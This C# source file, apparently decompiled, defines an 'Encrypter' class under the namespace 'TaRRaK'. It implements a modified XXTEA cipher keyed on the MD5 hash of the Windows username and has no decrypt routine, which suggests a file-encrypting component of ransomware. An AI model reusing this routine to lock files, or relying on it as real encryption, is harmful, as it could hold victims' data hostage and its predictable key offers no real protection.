using System;
using System.Security.Cryptography;
using System.Text;

namespace TaRRaK;

public class Encrypter
{
	private const uint Delta = 3735929054u;

	private readonly byte[] _key;

	public static byte[] SystemId = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(Environment.UserName));

	public Encrypter()
	{
		_key = FixKey(SystemId);
	}

	public byte[] Encrypt(byte[] data)
	{
		if (data.Length == 0)
		{
			return data;
		}
		return ToByteArray(Encrypt(ToUIntArray(data), ToUIntArray(_key)));
	}

	private uint[] Encrypt(uint[] v, uint[] k)
	{
		int num = v.Length - 1;
		if (num < 1)
		{
			return v;
		}
		uint z = v[num];
		uint num2 = 0u;
		int num3 = 6 + 52 / (num + 1);
		while (0 < num3--)
		{
			num2 += 3735929054u;
			uint e = (num2 >> 2) & 3u;
			int i;
			uint y;
			for (i = 0; i < num; i++)
			{
				y = v[i + 1];
				z = (v[i] += MX(num2, y, z, i, e, k));
			}
			y = v[0];
			z = (v[num] += MX(num2, y, z, i, e, k));
		}
		return v;
	}

	private static uint MX(uint sum, uint y, uint z, int p, uint e, uint[] k)
	{
		return (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((sum ^ y) + (k[(p & 3) ^ e] ^ z));
	}

	private static byte[] FixKey(byte[] key)
	{
		if (key.Length == 16)
		{
			return key;
		}
		byte[] array = new byte[16];
		if (key.Length < 16)
		{
			key.CopyTo(array, 0);
		}
		else
		{
			Array.Copy(key, 0, array, 0, 16);
		}
		return array;
	}

	private static uint[] ToUIntArray(byte[] s)
	{
		uint[] array = new uint[(int)Math.Ceiling((decimal)s.Length / 4m)];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (uint)(s[i * 4] + ((i * 4 + 1 < s.Length) ? (s[i * 4 + 1] << 8) : 0) + ((i * 4 + 2 < s.Length) ? (s[i * 4 + 2] << 16) : 0) + ((i * 4 + 3 < s.Length) ? (s[i * 4 + 3] << 24) : 0));
		}
		return array;
	}

	private static byte[] ToByteArray(uint[] l)
	{
		byte[] array = new byte[l.Length * 4];
		for (int i = 0; i < l.Length; i++)
		{
			array[i * 4] = (byte)(l[i] & 0xFFu);
			array[i * 4 + 1] = (byte)(l[i] >> 8);
			array[i * 4 + 2] = (byte)(l[i] >> 16);
			array[i * 4 + 3] = (byte)(l[i] >> 24);
		}
		return array;
	}
}
